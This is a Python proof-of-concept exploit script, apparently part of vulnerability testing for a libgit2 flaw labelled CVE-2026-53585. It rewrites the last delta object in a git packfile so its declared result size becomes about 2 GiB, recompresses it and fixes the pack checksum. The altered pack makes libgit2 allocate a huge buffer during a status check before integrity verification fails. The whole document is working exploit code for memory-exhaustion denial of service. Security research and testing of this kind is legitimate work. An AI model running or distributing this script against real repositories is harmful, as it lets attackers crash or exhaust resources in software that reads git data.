#!/usr/bin/env python3
# EXP-205 delta result-size inflation (CVE-2026-53585 probe).
# In the repo at argv[1], find the delta object with the largest pack offset
# (so only the trailing pack checksum follows it), decompress its delta stream,
# rewrite the target-size (result-size) varint to ~2 GiB, recompress, splice it
# back, and recompute the trailing SHA-1. The .idx offsets and oid table stay
# valid because we patch the last object only; libgit2 allocates the inflated
# result buffer during status unpack, before the final oid check.
import glob, hashlib, os, subprocess, sys, zlib

repo = sys.argv[1]
packs = glob.glob(os.path.join(repo, ".git/objects/pack/*.pack"))
if not packs:
    print("no packfile"); sys.exit(1)
pack = packs[0]

vp = subprocess.run(["git", "verify-pack", "-v", pack.replace(".pack", ".idx")],
                    capture_output=True, text=True)
# git verify-pack -v prints, per object:
#   <sha> <type> <size> <size-in-pack> <offset> [<depth> <base-sha>]
# Older git printed the literal type "ofs_delta"/"ref_delta"; git 2.43 prints
# the RESOLVED type ("blob"/"tree") and appends "<depth> <base-sha>" for a
# delta. Detect a delta either way: an explicit *_delta type, or a 7-field
# line whose last token is a 40-hex base sha.
import re as _re
_hex40 = _re.compile(r"^[0-9a-f]{40}$")
deltas = []
for line in vp.stdout.splitlines():
    parts = line.split()
    is_delta = False
    if len(parts) >= 5 and parts[1] in ("ofs_delta", "ref_delta"):
        is_delta = True
    elif len(parts) >= 7 and _hex40.match(parts[-1]):
        is_delta = True
    if is_delta:
        try:
            off = int(parts[4]); deltas.append((off, parts[1], parts[0]))
        except ValueError:
            pass
if not deltas:
    print("no delta objects in pack; delta arm not applicable for this repo"); sys.exit(2)
deltas.sort()
off, dtype, sha = deltas[-1]  # largest offset delta
print(f"patching {dtype} at offset {off} sha {sha}")

data = bytearray(open(pack, "rb").read())

# parse object header at off
p = off
c = data[p]; p += 1
otype = (c >> 4) & 7
shift = 4
while c & 0x80:
    c = data[p]; p += 1
    shift += 7
if otype == 6:  # OFS_DELTA: skip base-offset varint
    c = data[p]; p += 1
    while c & 0x80:
        c = data[p]; p += 1
elif otype == 7:  # REF_DELTA: skip 20-byte base sha
    p += 20
zstart = p

# decompress the delta stream (to end of the compressed blob)
dobj = zlib.decompressobj()
raw = dobj.decompress(bytes(data[zstart:]))
comp_len = len(data) - 20 - zstart - len(dobj.unused_data)
# unused_data includes the trailing 20-byte pack sha + anything after; the
# compressed stream ended where unused_data begins.
consumed = len(bytes(data[zstart:])) - len(dobj.unused_data)

def read_varint(b, i):
    val = 0; shift = 0
    while True:
        c = b[i]; i += 1
        val |= (c & 0x7f) << shift
        if not (c & 0x80):
            break
        shift += 7
    return val, i

def write_varint(val):
    out = bytearray()
    while True:
        b = val & 0x7f
        val >>= 7
        if val:
            out.append(b | 0x80)
        else:
            out.append(b); break
    return bytes(out)

src_size, i1 = read_varint(raw, 0)
tgt_size, i2 = read_varint(raw, i1)
print(f"delta src_size={src_size} target_size={tgt_size} (ops {len(raw)-i2} bytes)")

INFLATED = 0x7FFF_FFFF  # ~2 GiB result buffer demand
new_stream = raw[:i1] + write_varint(INFLATED) + raw[i2:]
recompressed = zlib.compress(bytes(new_stream), 9)

# splice: [0:zstart] + recompressed + trailing 20-byte sha (recomputed)
body = bytes(data[:zstart]) + recompressed
new_pack = body + hashlib.sha1(body).digest()
# git packs are written mode 0444; make writable before overwriting.
os.chmod(pack, 0o644)
with open(pack, "wb") as f:
    f.write(new_pack)
print(f"rewrote pack: target_size -> {INFLATED}; old_comp={consumed} new_comp={len(recompressed)} "
      f"pack {len(data)} -> {len(new_pack)} bytes; trailing sha recomputed")
print("NOTE: .idx offsets/oids unchanged (last object patched); final oid check will fail "
      "AFTER the inflated allocation during status unpack.")
